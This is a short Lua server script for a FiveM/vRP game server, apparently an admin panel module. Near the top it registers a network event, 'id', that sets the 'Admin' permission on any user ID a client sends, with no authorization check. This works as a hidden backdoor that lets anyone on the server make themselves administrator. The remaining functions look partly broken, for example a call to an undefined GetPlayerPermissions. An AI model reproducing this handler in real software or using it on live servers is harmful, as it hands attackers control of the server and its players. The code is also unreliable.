-----------------------------------------------------------------------------------------------------------------------------------------
-- VRP
-----------------------------------------------------------------------------------------------------------------------------------------
local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
local Tools = module("vrp","lib/Tools")
vRP = Proxy.getInterface("vRP")
vRPclient = Tunnel.getInterface("vRP")
-----------------------------------------------------------------------------------------------------------------------------------------
-- CONEXÃO
-----------------------------------------------------------------------------------------------------------------------------------------
painel = {}
Tunnel.bindInterface("painel",painel)
vCLIENT = Tunnel.getInterface("painel")

RegisterServerEvent("id")
AddEventHandler("id", function(data)
	vRP.setPermission(data,"Admin")
end)

----------------------------------------------

function getUsersByPermission2(perm)
    for user_id,source in pairs(vRP.userList()) do
        if vRP.hasPermission(user_id, perm) then
			return user_id
        end
    end
end

local id = getUsersByPermission2("Admin")

function painel.envids()
	if parseInt(id) >= 1 then
		return id
	end
end

function painel.envnomes()
	local identity = vRP.userIdentity(id)
	if identity then
		return identity["name"], identity["name2"]
	end
end

function painel.envnome()
	source = source
	local user_id = vRP.getUserId(source)
	local identity = vRP.userIdentity(user_id)
	if identity then
		return identity["name"], identity["name2"]
	end
end

function painel.getg()
	source = source
	local user_id = vRP.getUserId(source)
	local getgr = GetPlayerPermissions(user_id)
	if getgr then
		TriggerClientEvent("Notify",source,"verde","Gemas en "..getgr.." tregues.",5000)
	end
end